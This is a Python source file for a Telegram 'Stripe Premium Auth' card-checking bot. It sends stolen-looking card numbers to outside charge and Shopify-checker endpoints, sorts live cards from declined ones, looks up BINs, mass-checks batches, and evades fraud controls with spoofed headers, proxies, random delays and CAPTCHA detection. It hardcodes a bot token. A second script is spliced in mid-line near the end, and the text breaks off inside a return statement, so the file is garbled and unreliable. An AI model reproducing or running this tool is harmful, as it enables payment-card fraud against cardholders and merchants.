import aiohttp
import asyncio
import logging
import json
import random
import time
from aiogram import Bot, Dispatcher, types
from aiogram.types import FSInputFile
from aiogram.filters import Command
from fake_useragent import UserAgent
import hashlib
from datetime import datetime
from colorama import init, Fore, Back, Style

# Initialize colorama for colored console output
init(autoreset=True)

# ---- Config ----
API_TOKEN = "8224235130:AAHEg-BerzoVz-rpewEGSum8-es2YT50AFo"
bot = Bot(token=API_TOKEN)
dp = Dispatcher()

# Initialize UserAgent for random headers
ua = UserAgent()

# Default settings
DEFAULT_AMOUNT = 1
DEFAULT_LIMIT = 20
current_limit = DEFAULT_LIMIT

# Response categories
approved_keywords = [
    "APPROVED", "SUCCESS", "SUCCEEDED", "1000", "2001", "2010", "2011",
    "INSUFFICIENT_FUNDS", "INSUFFICIENT FUNDS"
]

charged_keywords = [
    "CHARGED", "PAYMENT_CAPTURED", "PAYMENT_SUCCESS", "0000", "THANK_YOU", "THANK YOU"
]

declined_keywords = [
    "DECLINED", "CARD_DECLINED", "GENERIC_DECLINE", "DO_NOT_HONOR",
    "YOUR CARD WAS DECLINED", "CARD WAS DECLINED",
    "LOST_CARD", "STOLEN_CARD", "EXPIRED_CARD",
    "INCORRECT_CVC", "PROCESSING_ERROR", "INCORRECT_NUMBER",
    "FAILED", "ERROR", "REJECTED", "REFUSED"
]

# Session storage
sessions_data = {}

# Console logging functions
def console_log_request(url, headers):
    """Log API request details to console"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print(f"\n{Fore.CYAN}{'='*60}")
    print(f"{Fore.YELLOW}[{timestamp}] API REQUEST")
    print(f"{Fore.CYAN}{'='*60}")
    print(f"{Fore.GREEN}URL: {Fore.WHITE}{url}")
    print(f"{Fore.GREEN}User-Agent: {Fore.WHITE}{headers.get('User-Agent', 'N/A')[:50]}...")
    print(f"{Fore.CYAN}{'='*60}")

def console_log_response(status_code, response_text, cc):
    """Log API response details to console"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print(f"\n{Fore.MAGENTA}{'='*60}")
    print(f"{Fore.YELLOW}[{timestamp}] API RESPONSE")
    print(f"{Fore.MAGENTA}{'='*60}")
    print(f"{Fore.GREEN}Status Code: {Fore.WHITE}{status_code}")
    print(f"{Fore.GREEN}CC: {Fore.WHITE}{cc[:4]}****")
    print(f"{Fore.GREEN}Response: {Fore.WHITE}{response_text[:200]}")
    print(f"{Fore.MAGENTA}{'='*60}")

def get_random_headers():
    """Generate random browser headers"""
    headers = {
        'User-Agent': ua.random,
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': random.choice([
            'en-US,en;q=0.9',
            'en-GB,en;q=0.9',
            'en-US,en;q=0.8,es;q=0.7'
        ]),
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Cache-Control': 'no-cache'
    }
    return headers

def get_human_delay():
    """Generate human-like random delay"""
    return random.uniform(5, 10)

# ---- BIN Lookup Function ----
async def lookup_bin(bin_number):
    """Lookup BIN information from binlist.net"""
    try:
        url = f"https://lookup.binlist.net/{bin_number}"
        async with aiohttp.ClientSession() as session:
            headers = {'Accept-Version': '3'}
            async with session.get(url, headers=headers, timeout=10) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    
                    print(f"{Fore.GREEN}[BIN DATA] {json.dumps(data, indent=2)}")
                    
                    # Extract information from actual API response
                    scheme = data.get('scheme', 'N/A').upper()
                    card_type = data.get('type', 'N/A').upper()
                    brand = data.get('brand', 'N/A')
                    
                    # Bank info
                    bank_info = data.get('bank', {})
                    bank = bank_info.get('name', 'N/A').upper() if bank_info else 'N/A'
                    
                    # Country info - API already provides emoji!
                    country_info = data.get('country', {})
                    if country_info:
                        country_name = country_info.get('name', 'N/A').upper()
                        country_emoji = country_info.get('emoji', '🏳️')  # API provides emoji
                        currency = country_info.get('currency', 'N/A')
                    else:
                        country_name = 'N/A'
                        country_emoji = '🏳️'
                        currency = 'N/A'
                    
                    return {
                        "scheme": scheme,
                        "type": card_type,
                        "brand": brand,
                        "bank": bank,
                        "country": country_name,
                        "flag": country_emoji,
                        "currency": currency
                    }
                else:
                    print(f"{Fore.RED}[BIN LOOKUP] Failed: {resp.status}")
                    return None
    except Exception as e:
        print(f"{Fore.RED}[BIN ERROR] {str(e)}")
        return None

# ---- API Request ----
async def check_cc(cc, session_id=None):
    # Build URL
    url = f"https://stripe-charge.stormx.pw/index.cpp?key=dark&cc={cc}&amount={DEFAULT_AMOUNT}"
    
    # Get BIN (first 6 digits)
    bin_number = cc.split('|')[0][:6]
    
    # Generate session ID
    if not session_id:
        session_id = hashlib.md5(f"check_{time.time()}".encode()).hexdigest()
    
    # Start time for measuring
    start_time = time.time()
    
    try:
        timeout = aiohttp.ClientTimeout(total=30)
        
        if session_id not in sessions_data:
            sessions_data[session_id] = aiohttp.CookieJar()
        
        async with aiohttp.ClientSession(
            timeout=timeout,
            cookie_jar=sessions_data[session_id]
        ) as session:
            
            headers = get_random_headers()
            
            # Log request to console
            console_log_request(url, headers)
            
            async with session.get(url, headers=headers) as resp:
                text = await resp.text()
                
                # Calculate time taken
                time_taken = round(time.time() - start_time, 2)
                
                # Log response to console
                console_log_response(resp.status, text, cc)
                
                if resp.status != 200:
                    return {
                        "message": f"HTTP Error {resp.status}",
                        "status": "error",
                        "cc": cc,
                        "time": time_taken,
                        "bin_info": None
                    }

                # Try to parse JSON response
                try:
                    data = json.loads(text)
                    response_msg = data.get('response', data.get('message', text))
                except:
                    response_msg = text
                
                # Check response text (uppercase for comparison)
                check_text = response_msg.upper() if response_msg else ""
                
                # Determine status
                status = "declined"
                if any(keyword in check_text for keyword in approved_keywords):
                    status = "approved"
                    print(f"{Fore.GREEN}[APPROVED] {cc[:4]}**** - {response_msg}")
                elif any(keyword in check_text for keyword in charged_keywords):
                    status = "charged"
                    print(f"{Fore.YELLOW}[CHARGED] {cc[:4]}**** - {response_msg}")
                else:
                    status = "declined"
                    print(f"{Fore.RED}[DECLINED] {cc[:4]}**** - {response_msg}")
                
                # Lookup BIN info
                bin_info = await lookup_bin(bin_number)
                
                return {
                    "message": response_msg,
                    "status": status,
                    "cc": cc,
                    "time": time_taken,
                    "bin_info": bin_info
                }
                
    except asyncio.TimeoutError:
        time_taken = round(time.time() - start_time, 2)
        return {
            "message": "Request Timeout",
            "status": "error",
            "cc": cc,
            "time": time_taken,
            "bin_info": None
        }
    except Exception as e:
        time_taken = round(time.time() - start_time, 2)
        return {
            "message": f"Error: {str(e)}",
            "status": "error",
            "cc": cc,
            "time": time_taken,
            "bin_info": None
        }

# ---- Format Result Function ----
def format_result(result, username="User"):
    """Format the result in the specified style"""
    cc = result['cc']
    status = result['status']
    message = result['message']
    time_taken = result['time']
    bin_info = result['bin_info']
    
    # Status emoji and text
    if status == "approved":
        status_text = "Approved ✅"
    elif status == "charged":
        status_text = "Charged 💳"
    elif status == "declined":
        status_text = "Declined ❌"
    else:
        status_text = "Error ⚠️"
    
    # Build the formatted message
    formatted = f"""『 𝐒𝐭𝐫𝐢𝐩𝐞 𝐏𝐫𝐞𝐦𝐢𝐮𝐦 𝐀𝐮𝐭𝐡 [ /auth ] 』
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
𝗖𝗮𝗿𝗱 ➜ {cc}
𝐒𝐭𝐚𝐭𝐮𝐬 ➜ {status_text}
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➜ {message}
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━"""
    
    # Add BIN info if available
    if bin_info:
        info_text = f"{bin_info['scheme']} - {bin_info['type']} - {bin_info['brand']}"
        bank_text = bin_info['bank']
        country_text = f"{bin_info['country']} - {bin_info['flag']} - {bin_info['currency']}"
        
        formatted += f"""
𝗜𝗻𝗳𝗼 ➜ {info_text}
𝐁𝐚𝐧𝐤 ➜ {bank_text}
𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➜ {country_text}
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━"""
    
    # Add time and user info
    formatted += f"""
𝗧𝗶𝗺𝗲 ➜ {time_taken} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬
𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲 ➜ {username} [ PREMIUM ]
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
𝐁𝐨𝐭 𝐁𝐲 ➜ 𝐈𝐛𝐫"""
    
    return formatted

# ---- Animated Loading Bar ----
async def show_loading_animation(message, cc):
    """Show animated loading bar"""
    loading_frames = [
        f"𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠 ➜ ■□□□\n━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━\n𝐂𝐚𝐫𝐝 ➜ {cc}\n𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➜『 Stripe Premium Auth [ /auth ] 』",
        f"𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠 ➜ □■□□\n━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━\n𝐂𝐚𝐫𝐝 ➜ {cc}\n𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➜『 Stripe Premium Auth [ /auth ] 』",
        f"𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠 ➜ □□■□\n━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━\n𝐂𝐚𝐫𝐝 ➜ {cc}\n𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➜『 Stripe Premium Auth [ /auth ] 』",
        f"𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠 ➜ □□□■\n━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━\n𝐂𝐚𝐫𝐝 ➜ {cc}\n𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➜『 Stripe Premium Auth [ /auth ] 』",
        f"𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠 ➜ ■■■■\n━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━\n𝐂𝐚𝐫𝐝 ➜ {cc}\n𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➜『 Stripe Premium Auth [ /auth ] 』"
    ]
    
    for frame in loading_frames[:-1]:
        await message.edit_text(frame)
        await asyncio.sleep(0.5)
    
    # Show final frame
    await message.edit_text(loading_frames[-1])
    return message

# ---- Commands ----
@dp.message(Command("cmds"))
async def cmds(message: types.Message):
    print(f"{Fore.CYAN}[COMMAND] User {message.from_user.username} used /cmds")
    cmds_list = """
📌 𝐀𝐯𝐚𝐢𝐥𝐚𝐛𝐥𝐞 𝐂𝐨𝐦𝐦𝐚𝐧𝐝𝐬:

💳 𝐂𝐂 𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠:
/auth <cc> - Check single CC
/mass <ccs> - Check multiple CCs

⚙️ 𝐒𝐞𝐭𝐭𝐢𝐧𝐠𝐬:
/lt <number> - Set limit (default: 20)

📊 𝐎𝐭𝐡𝐞𝐫:
/cmds - Show all commands
/status - Show bot status
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
𝐁𝐨𝐭 𝐁𝐲 ➜ 𝐈𝐛𝐫
"""
    await message.answer(cmds_list)

# ---- Status Command ----
@dp.message(Command("status"))
async def status(message: types.Message):
    print(f"{Fore.CYAN}[COMMAND] Status requested")
    status_msg = f"""
🤖 𝐒𝐭𝐫𝐢𝐩𝐞 𝐏𝐫𝐞𝐦𝐢𝐮𝐦 𝐒𝐭𝐚𝐭𝐮𝐬:
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
💳 Gateway: Active
💵 Amount: ${DEFAULT_AMOUNT}
📝 Limit: {current_limit} cards
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
🛡️ Protection: Active
⏱️ Delay: 5-10 seconds
🔍 BIN Lookup: Enabled
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
𝐁𝐨𝐭 𝐁𝐲 ➜ 𝐈𝐛𝐫
"""
    await message.answer(status_msg)

# ---- Set Limit Command ----
@dp.message(Command("lt"))
async def set_limit(message: types.Message):
    global current_limit
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        await message.answer(f"⚠️ Usage: /lt <number>\nCurrent limit: {current_limit}")
        return
    
    try:
        new_limit = int(parts[1].strip())
        if 1 <= new_limit <= 100:
            current_limit = new_limit
            print(f"{Fore.GREEN}[SETTINGS] Limit set to {new_limit}")
            await message.answer(f"✅ Limit set to {new_limit} cards")
        else:
            await message.answer("⚠️ Limit must be between 1 and 100")
    except ValueError:
        await message.answer("⚠️ Invalid number. Please enter a valid number.")

# ---- Single CC Check (Auth) ----
@dp.message(Command("auth"))
async def auth(message: types.Message):
    print(f"{Fore.CYAN}[COMMAND] Auth check requested by {message.from_user.username}")
    
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        await message.answer("⚠️ Usage: /auth <cc>")
        return

    cc = parts[1].strip()
    username = message.from_user.first_name or message.from_user.username or "User"
    
    print(f"{Fore.YELLOW}[CHECKING] CC: {cc[:4]}****")
    
    # Show animated loading
    msg = await message.answer("Starting check...")
    msg = await show_loading_animation(msg, cc)
    
    # Check the card
    result = await check_cc(cc)
    
    # Format and send result
    formatted_result = format_result(result, username)
    await msg.edit_text(formatted_result)

# ---- Mass CC Check ----
@dp.message(Command("mass"))
async def mass(message: types.Message):
    print(f"{Fore.CYAN}[COMMAND] Mass check requested by {message.from_user.username}")
    
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        await message.answer("⚠️ Usage: /mass <ccs>")
        return

    ccs = parts[1].splitlines()
    username = message.from_user.first_name or message.from_user.username or "User"
    
    # Apply limit
    if len(ccs) > current_limit:
        ccs = ccs[:current_limit]
        await message.answer(f"⚠️ Limited to {current_limit} cards. Use /lt to change limit.")
    
    print(f"{Fore.YELLOW}[MASS CHECK] Starting check for {len(ccs)} cards")
    
    # Initialize counters
    approved_count = 0
    charged_count = 0
    declined_count = 0
    
    # Initialize result lists
    approved_results = []
    charged_results = []
    declined_results = []
    all_results = []
    
    msg = await message.answer(f"⏳ Starting mass check for {len(ccs)} cards...")
    
    total = len(ccs)
    session_id = hashlib.md5(f"mass_{time.time()}".encode()).hexdigest()
    
    for index, cc in enumerate(ccs, 1):
        # Delay between checks
        if index > 1:
            delay = get_human_delay()
            print(f"{Fore.CYAN}[DELAY] Waiting {delay:.1f} seconds")
            await asyncio.sleep(delay)
        
        print(f"{Fore.YELLOW}[PROGRESS] Checking card {index}/{total}")
        
        # Update progress
        progress_text = f"𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠 ➜ Card {index}/{total}\n"
        progress_text += f"━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━\n"
        progress_text += f"✅ Approved: {approved_count}\n"
        progress_text += f"💳 Charged: {charged_count}\n"
        progress_text += f"❌ Declined: {declined_count}"
        
        await msg.edit_text(progress_text)
        
        # Check the card
        res = await check_cc(cc.strip(), session_id)
        
        # Format result
        formatted = format_result(res, username)
        all_results.append(formatted)
        
        # Update counters
        if res["status"] == "approved":
            approved_count += 1
            approved_results.append(formatted)
        elif res["status"] == "charged":
            charged_count += 1
            charged_results.append(formatted)
            # Send instant notification for charged
            await message.answer(f"💎 𝐂𝐇𝐀𝐑𝐆𝐄𝐃 𝐂𝐀𝐑𝐃 𝐅𝐎𝐔𝐍𝐃!\n\n{formatted}")
        else:
            declined_count += 1
            declined_results.append(formatted)
    
    # Final summary
    summary = f"""
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
✅ 𝐌𝐚𝐬𝐬 𝐂𝐡𝐞𝐜𝐤 𝐂𝐨𝐦𝐩𝐥𝐞𝐭𝐞!
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
📊 𝐓𝐨𝐭𝐚𝐥: {total}
✅ 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝: {approved_count}
💳 𝐂𝐡𝐚𝐫𝐠𝐞𝐝: {charged_count}
❌ 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝: {declined_count}
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲 ➜ {username} [ PREMIUM ]
𝐁𝐨𝐭 𝐁𝐲 ➜ 𝐈𝐛𝐫
"""
    await message.answer(summary)
    
    # Save results to files
    files_to_send = []
    
    if approved_results:
        with open("approved.txt", "w", encoding='utf-8') as f:
            f.write("\n\n".join(approved_results))
        files_to_send.append(("approved.txt", f"✅ Approved: {approved_count}"))
    
    if charged_results:
        with open("charged.txt", "w", encoding='utf-8') as f:
            f.write("\n\n".join(charged_results))
        files_to_send.append(("charged.txt", f"💳 Charged: {charged_count}"))
    
    if declined_results:
        with open("declined.txt", "w", encoding='utf-8') as f:
            f.write("\n\n".join(declined_results))
        files_to_send.append(("declined.txt", f"❌ Declined: {declined_count}"))
    
    # Send files
    for filename, caption in files_to_send:
        await message.answer_document(FSInputFile(filename), caption=caption)

# ---- Start ----
@dp.message(Command("start"))
async def start(message: types.Message):
    username = message.from_user.first_name or message.from_user.username or "User"
    print(f"{Fore.CYAN}[COMMAND] Bot started by {username}")
    
    welcome_msg = f"""
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
👋 𝐖𝐞𝐥𝐜𝐨𝐦𝐞 {username}!
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
『 𝐒𝐭𝐫𝐢𝐩𝐞 𝐏𝐫𝐞𝐦𝐢𝐮𝐦 𝐀𝐮𝐭𝐡 』

🔥 𝐐𝐮𝐢𝐜𝐤 𝐒𝐭𝐚𝐫𝐭:
• Single: /auth <cc>
• Mass: /mass <ccs>

💳 𝐅𝐞𝐚𝐭𝐮𝐫𝐞𝐬:
• Live Gateway
• BIN Information
• Bank Details
• Country Info with Flags

⚙️ 𝐒𝐞𝐭𝐭𝐢𝐧𝐠𝐬:
• Limit: /lt <number>
• Current: {current_limit} cards

━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
𝐁𝐨𝐭 𝐁𝐲 ➜ 𝐈𝐛𝐫
"""
    await message.answer(welcome_msg)

async def main():
    logging.basicConfig(level=logging.INFO)
    
    # Console startup message
    print(f"{Fore.BLUE}{'='*60}")
    print(f"{Fore.YELLOW}🤖 Stripe Premium Auth Bot Starting...")
    print(f"{Fore.BLUE}{'='*60}")
    print(f"{Fore.GREEN}💳 Gateway: Stripe Premium Auth")
    print(f"{Fore.GREEN}💵 Amount: ${DEFAULT_AMOUNT}")
    print(f"{Fore.GREEN}📝 Default Limit: {DEFAULT_LIMIT} cards")
    print(f"{Fore.GREEN}⏱️ Delay: 5-10 seconds")
    print(f"{Fore.GREEN}🔍 BIN Lookup: Enabled (with Emoji Flags)")
    print(f"{Fore.GREEN}📊 Console Logging: ENABLED")
    print(f"{Fore.BLUE}{'='*60}")
    print(f"{Fore.YELLOW}✅ Bot Ready!")
    print(f"{Fore.CYAN}🔥 Bot By: Ibr")
    print(f"{Fore.BLUE}{'='*60}\n")
    
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())proxies = []

# Valid site responses (these mean site is working)
VALID_SITE_RESPONSES = [
    "CARD_DECLINED",
    "FRAUD_SUSPECTED", 
    "INSUFFICIENT_FUNDS",
    "THANK YOU",
    "THANK_YOU",
    "3D_SECURED",
    "3D CC",
    "GENERIC_ERROR",
    "DECLINED",
    "APPROVED",
    "CHARGED"
]

# Response categories for actual CC checking
approved_keywords = ["INSUFFICIENT_FUNDS", "APPROVED", "SUCCESS", "SUCCEEDED"]
charged_keywords = ["CHARGED", "THANK YOU", "PAYMENT_SUCCESS", "TRANSACTION_SUCCESS", "THANK_YOU"]
declined_keywords = ["DECLINED", "GENERIC_ERROR", "FAILED", "ERROR", "REJECTED", "REFUSED", "CARD_DECLINED", "FRAUD_SUSPECTED"]
recaptcha_keywords = ["RECAPTCHA", "CAPTCHA", "CHALLENGE", "VERIFY_HUMAN", "BOT_DETECTED"]

# Session storage for cookies
sessions_data = {}

# Console logging functions
def console_log_request(url, headers, proxy):
    """Log API request details to console"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print(f"\n{Fore.CYAN}{'='*60}")
    print(f"{Fore.YELLOW}[{timestamp}] API REQUEST")
    print(f"{Fore.CYAN}{'='*60}")
    print(f"{Fore.GREEN}URL: {Fore.WHITE}{url}")
    print(f"{Fore.GREEN}Proxy: {Fore.WHITE}{proxy if proxy else 'None'}")
    print(f"{Fore.GREEN}User-Agent: {Fore.WHITE}{headers.get('User-Agent', 'N/A')[:50]}...")
    print(f"{Fore.CYAN}{'='*60}")

def console_log_response(status_code, response_text, cc, site):
    """Log API response details to console"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print(f"\n{Fore.MAGENTA}{'='*60}")
    print(f"{Fore.YELLOW}[{timestamp}] API RESPONSE")
    print(f"{Fore.MAGENTA}{'='*60}")
    print(f"{Fore.GREEN}Status Code: {Fore.WHITE}{status_code}")
    print(f"{Fore.GREEN}CC: {Fore.WHITE}{cc[:4]}****")
    print(f"{Fore.GREEN}Site: {Fore.WHITE}{site}")
    
    # Parse and display response
    try:
        data = json.loads(response_text)
        print(f"{Fore.GREEN}Gateway: {Fore.WHITE}{data.get('Gateway', 'N/A')}")
        print(f"{Fore.GREEN}Price: {Fore.WHITE}{data.get('Price', 'N/A')}")
        
        response = data.get('Response', 'N/A')
        # Color code the response based on status
        if any(keyword in response.upper() for keyword in approved_keywords):
            print(f"{Fore.GREEN}Response: {Fore.LIGHTGREEN_EX}{response}")
        elif any(keyword in response.upper() for keyword in charged_keywords):
            print(f"{Fore.GREEN}Response: {Fore.LIGHTYELLOW_EX}{response}")
        else:
            print(f"{Fore.GREEN}Response: {Fore.LIGHTRED_EX}{response}")
    except:
        print(f"{Fore.GREEN}Raw Response: {Fore.WHITE}{response_text[:100]}...")
    
    print(f"{Fore.MAGENTA}{'='*60}")

def console_log_error(error_msg, cc, site):
    """Log errors to console"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print(f"\n{Fore.RED}{'='*60}")
    print(f"{Fore.YELLOW}[{timestamp}] ERROR")
    print(f"{Fore.RED}{'='*60}")
    print(f"{Fore.RED}CC: {Fore.WHITE}{cc[:4]}****")
    print(f"{Fore.RED}Site: {Fore.WHITE}{site}")
    print(f"{Fore.RED}Error: {Fore.WHITE}{error_msg}")
    print(f"{Fore.RED}{'='*60}")

def console_log_summary(total, approved, charged, declined):
    """Log checking summary to console"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print(f"\n{Fore.BLUE}{'='*60}")
    print(f"{Fore.YELLOW}[{timestamp}] CHECKING SUMMARY")
    print(f"{Fore.BLUE}{'='*60}")
    print(f"{Fore.CYAN}Total Checked: {Fore.WHITE}{total}")
    print(f"{Fore.GREEN}Approved: {Fore.WHITE}{approved}")
    print(f"{Fore.YELLOW}Charged: {Fore.WHITE}{charged}")
    print(f"{Fore.RED}Declined: {Fore.WHITE}{declined}")
    print(f"{Fore.BLUE}{'='*60}\n")

def get_random_headers():
    """Generate random browser headers"""
    headers = {
        'User-Agent': ua.random,
        'Accept': random.choice([
            'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
        ]),
        'Accept-Language': random.choice([
            'en-US,en;q=0.9',
            'en-GB,en;q=0.9',
            'en-US,en;q=0.8,es;q=0.7',
            'en-US,en;q=0.9,fr;q=0.8'
        ]),
        'Accept-Encoding': 'gzip, deflate, br',
        'DNT': random.choice(['1', None]),
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': random.choice(['document', 'empty']),
        'Sec-Fetch-Mode': random.choice(['navigate', 'cors', 'no-cors']),
        'Sec-Fetch-Site': random.choice(['none', 'same-origin', 'cross-site']),
        'Cache-Control': random.choice(['max-age=0', 'no-cache']),
        'Referer': random.choice([
            'https://www.google.com/',
            'https://www.bing.com/',
            'https://duckduckgo.com/',
            None
        ])
    }
    # Remove None values
    return {k: v for k, v in headers.items() if v is not None}

def get_human_delay():
    """Generate human-like random delay"""
    delay_patterns = [
        random.uniform(8, 15),    # Quick check
        random.uniform(15, 25),   # Normal check
        random.uniform(25, 40),   # Careful check
        random.uniform(5, 10),    # Rush check
    ]
    
    # Sometimes add extra delay (like human distraction)
    if random.random() < 0.1:  # 10% chance
        delay_patterns.append(random.uniform(45, 90))
    
    return random.choice(delay_patterns)

async def verify_site(site):
    """Verify if site is working using test card"""
    if not proxies:
        return False, "No proxy available for site verification"
    
    proxy = random.choice(proxies)
    url = f"https://kamalxd.com/shopify/sh.php?cc={TEST_CARD}&site={site}&proxy={proxy}"
    
    print(f"\n{Fore.YELLOW}[SITE VERIFICATION] Testing: {site}")
    
    try:
        timeout = aiohttp.ClientTimeout(total=30)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            headers = get_random_headers()
            
            # Log request to console
            console_log_request(url, headers, proxy)
            
            async with session.get(url, headers=headers) as resp:
                text = await resp.text()
                
                # Log response to console
                console_log_response(resp.status, text, TEST_CARD, site)
                
                if resp.status != 200:
                    return False, f"HTTP {resp.status}"
                
                # Check for recaptcha
                upper_text = text.upper()
                for keyword in recaptcha_keywords:
                    if keyword in upper_text:
                        print(f"{Fore.RED}[RECAPTCHA DETECTED] Site: {site}")
                        return False, "RECAPTCHA DETECTED"
                
                try:
                    data = json.loads(text)
                    response = data.get('Response', '').upper()
                    
                    # Check if response is in valid list
                    for valid_response in VALID_SITE_RESPONSES:
                        if valid_response in response:
                            print(f"{Fore.GREEN}[SITE VALID] Response: {response}")
                            return True, f"Valid response: {response}"
                    
                    print(f"{Fore.RED}[SITE INVALID] Response: {response}")
                    return False, f"Invalid response: {response}"
                    
                except Exception as e:
                    print(f"{Fore.RED}[JSON ERROR] {str(e)}")
                    return False, "Invalid JSON response"
                    
    except asyncio.TimeoutError:
        print(f"{Fore.RED}[TIMEOUT] Site verification timeout for {site}")
        return False, "Timeout"
    except Exception as e:
        print(f"{Fore.RED}[EXCEPTION] {str(e)}")
        return False, str(e)

# ---- API Request with Site Verification ----
async def check_cc(cc, site, proxy=None, session_id=None):
    # Use proxy if available, otherwise use 'none'
    proxy_param = proxy if proxy else 'none'
    url = f"https://kamalxd.com/shopify/sh.php?cc={cc}&site={site}&proxy={proxy_param}"
    
    # Generate session ID for cookie persistence
    if not session_id:
        session_id = hashlib.md5(f"{site}_{time.time()}".encode()).hexdigest()
    
    try:
        # Configure session with timeout and headers
        timeout = aiohttp.ClientTimeout(total=random.uniform(25, 35))
        
        # Get or create cookie jar for this session
        if session_id not in sessions_data:
            sessions_data[session_id] = aiohttp.CookieJar()
        
        async with aiohttp.ClientSession(
            timeout=timeout,
            cookie_jar=sessions_data[session_id]
        ) as session:
            
            headers = get_random_headers()
            
            # Log request to console
            console_log_request(url, headers, proxy_param)
            
            async with session.get(url, headers=headers) as resp:
                text = await resp.text()
                
                # Log response to console
                console_log_response(resp.status, text, cc, site)
                
                if resp.status != 200:
                    return {
                        "text": (f"CC: {cc}\n"
                                f"🌐 Gateway: {site}\n"
                                f"💲 Price: NA\n"
                                f"🔌 Proxy: {proxy_param}\n"
                                f"📡 Response: HTTP {resp.status}"),
                        "status": "error",
                        "has_recaptcha": False
                    }

                # Check for recaptcha
                upper_text = text.upper()
                for keyword in recaptcha_keywords:
                    if keyword in upper_text:
                        print(f"{Fore.RED}[RECAPTCHA] Detected for CC: {cc[:4]}****")
                        return {
                            "text": (f"CC: {cc}\n"
                                    f"🌐 Gateway: {site}\n"
                                    f"💲 Price: NA\n"
                                    f"🔌 Proxy: {proxy_param}\n"
                                    f"📡 Response: RECAPTCHA DETECTED"),
                            "status": "error",
                            "has_recaptcha": True
                        }

                try:
                    data = json.loads(text)
                except Exception as e:
                    console_log_error(f"JSON Parse Error: {str(e)}", cc, site)
                    return {
                        "text": (f"CC: {cc}\n"
                                f"🌐 Gateway: NA\n"
                                f"💲 Price: NA\n"
                                f"🔌 Proxy: {proxy_param}\n"
                                f"📡 Response: Invalid JSON → {text[:100]}"),
                        "status": "error",
                        "has_recaptcha": False
                    }

                response = data.get('Response', 'NA').upper()
                
                # Categorize response
                status = "declined"  # default
                if any(keyword in response for keyword in approved_keywords):
                    status = "approved"
                    print(f"{Fore.GREEN}[APPROVED] CC: {cc[:4]}**** Response: {response}")
                elif any(keyword in response for keyword in charged_keywords):
                    status = "charged"
                    print(f"{Fore.YELLOW}[CHARGED] CC: {cc[:4]}**** Response: {response}")
                elif any(keyword in response for keyword in declined_keywords):
                    status = "declined"
                    print(f"{Fore.RED}[DECLINED] CC: {cc[:4]}**** Response: {response}")
                
                result_text = (f"CC: {data.get('cc', cc)}\n"
                              f"🌐 Gateway: {data.get('Gateway', 'NA')}\n"
                              f"💲 Price: {data.get('Price', 'NA')}\n"
                              f"🔌 Proxy: {proxy_param}\n"
                              f"📡 Response: {data.get('Response', 'NA')}")
                
                return {
                    "text": result_text,
                    "status": status,
                    "has_recaptcha": False
                }
                
    except asyncio.TimeoutError:
        console_log_error("Request Timeout", cc, site)
        return {
            "text": (f"CC: {cc}\n"
                    f"🌐 Gateway: NA\n"
